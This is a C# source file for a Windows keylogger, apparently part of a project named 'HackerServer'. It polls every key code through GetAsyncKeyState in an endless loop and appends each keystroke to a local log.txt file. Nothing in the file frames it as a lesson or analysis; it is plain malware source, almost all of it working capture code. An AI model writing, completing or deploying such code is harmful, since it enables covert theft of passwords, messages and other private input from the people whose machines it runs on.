using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace HackerServer
{
    class Keylogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        StreamWriter writer;
        public void StartLogging()
        {
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        string text = "";

                        if ((Keys)i == Keys.Space)
                            text = " ";
                        if ((Keys)i == Keys.Enter)
                            text = "\n";

                        if (!File.Exists("log.txt"))
                            File.Create("log.txt");

                        writer = File.AppendText("log.txt");
                        if (text != "")
                        {
                            writer.Write(text);
                        }

                        else
                            writer.Write((Keys)i);

                        writer.Close();
                        break;
                    }
                }
            }
        }
    }
}
